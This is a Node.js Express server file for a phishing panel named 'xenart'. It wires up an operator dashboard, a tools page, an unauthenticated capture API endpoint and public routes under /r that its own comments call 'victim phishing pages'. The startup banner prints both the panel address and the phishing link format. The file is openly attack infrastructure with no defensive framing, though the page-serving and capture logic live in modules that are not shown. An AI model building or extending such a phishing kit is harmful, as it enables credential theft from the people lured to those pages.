// [xenart — Express panel server, Node.js 18+, any OS]
require('dotenv').config();
const express    = require('express');
const session    = require('express-session');
const path       = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

/* ── middleware ── */
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret:            process.env.SESSION_SECRET || 'xenart_dev_secret_change_me',
  resave:            false,
  saveUninitialized: false,
  cookie:            { secure: false, maxAge: 86400000 * 7 }
}));

/* ── static public assets ── */
app.use('/public', express.static(path.join(__dirname, 'public')));

/* ── init DB (runs once on boot) ── */
require('./db/init');

/* ── auth guard ── */
const guard = (req, res, next) => {
  if (req.session && req.session.user) return next();
  res.redirect('/login');
};

/* ── auth routes ── */
app.use('/auth', require('./routes/auth'));

/* ── panel API (all require auth except /api/capture/:id) ── */
app.use('/api', require('./routes/api'));

/* ── victim phishing pages (public) ── */
app.use('/r', require('./routes/phish'));

/* ── panel HTML pages ── */
const view = (file) => (req, res) =>
  res.sendFile(path.join(__dirname, 'views', file));

app.get('/',          guard, view('dashboard.html'));
app.get('/dashboard', guard, view('dashboard.html'));
app.get('/settings',  guard, view('settings.html'));
app.get('/tools',     guard, view('tools.html'));
app.get('/login',           (req, res) => {
  if (req.session && req.session.user) return res.redirect('/dashboard');
  view('login.html')(req, res);
});

/* ── 404 ── */
app.use((req, res) => res.status(404).send('not found'));

app.listen(PORT, () => {
  console.log(`\n  ██╗  ██╗███████╗███╗   ██╗ █████╗ ██████╗ ████████╗`);
  console.log(`  ╚██╗██╔╝██╔════╝████╗  ██║██╔══██╗██╔══██╗╚══██╔══╝`);
  console.log(`   ╚███╔╝ █████╗  ██╔██╗ ██║███████║██████╔╝   ██║   `);
  console.log(`   ██╔██╗ ██╔══╝  ██║╚██╗██║██╔══██║██╔══██╗   ██║   `);
  console.log(`  ██╔╝ ██╗███████╗██║ ╚████║██║  ██║██║  ██║   ██║   `);
  console.log(`  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n`);
  console.log(`  Panel → http://localhost:${PORT}`);
  console.log(`  Phish  → http://localhost:${PORT}/r/:linkId\n`);
});
